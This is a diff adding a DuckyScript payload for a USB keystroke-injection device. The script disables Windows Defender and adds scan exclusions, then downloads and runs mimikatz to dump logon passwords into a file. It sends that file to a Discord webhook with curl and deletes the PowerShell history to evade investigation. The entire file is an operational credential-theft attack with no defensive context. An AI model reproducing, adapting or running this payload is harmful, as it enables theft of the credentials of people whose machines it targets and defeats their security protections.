@@ -1,0 +1,97 @@
+REM Pause for everything to recognize and be ready
+DELAY 2000
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+REM Navigate to Manage Settings
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+REM Exit security settings
+ALT F4
+DELAY 500
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+REM Exclude drive C from Defender
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+DELAY 2000
+REM Exit Powershell
+STRING EXIT
+ENTER
+DEFAULT_DELAY 350
+REM -------------first delay is 1 second (you may need more) to let windows set up the "keyboard"
+DELAY 1000
+REM ------------open powershell as admin and set an exclusion path in the C:\Users path
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 600
+ALT y
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+STRING exit
+ENTER
+REM -------------download mimikatz
+GUI r
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 600
+ALT y
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe','%temp%\pw.exe')
+ENTER
+REM ------------run the following mimikatz commands and print results in new txt file
+DELAY 5000
+STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
+ENTER 
+STRING privilege::debug
+ENTER
+STRING sekurlsa::logonPasswords full
+ENTER
+STRING exit
+ENTER
+REM< --------- delete mimikatz
+STRING del %TEMP%\pw.exe
+ENTER
+STRING exit
+ENTER
+REM -------- Send log to discord webhook
+GUI r
+STRING powershell
+ENTER
+STRING $hookurl = "your webhook here"
+ENTER
+STRING $logpath = "c:\pwlog.txt"
+ENTER
+STRING curl.exe -F "file1=@$logpath" $hookurl
+ENTER
+DELAY 2000
+REM -------remove powershell history: this probably wont be enough to remove all traces of you, this is just to prevent inital investigations
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING exit
+ENTER
